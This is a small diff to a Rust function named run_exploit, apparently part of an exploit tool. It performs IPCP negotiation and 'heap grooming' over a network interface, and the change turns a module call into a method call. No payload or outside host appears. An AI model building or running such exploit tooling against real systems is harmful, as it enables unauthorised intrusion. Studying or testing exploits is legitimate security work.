@@ -41,7 +41,7 @@ fn run_exploit(interface_name: String) {
     expl.ipcp_negotiation(&interface);
     println!("[*] Initial Negotiations Done...");
     println!("[*] Starting Heap Grooming...");
-    exploit::heap_grooming(&interface);
+    expl.heap_grooming(&interface);
     handler.stop();
     println!("[*] DONE!");
 }
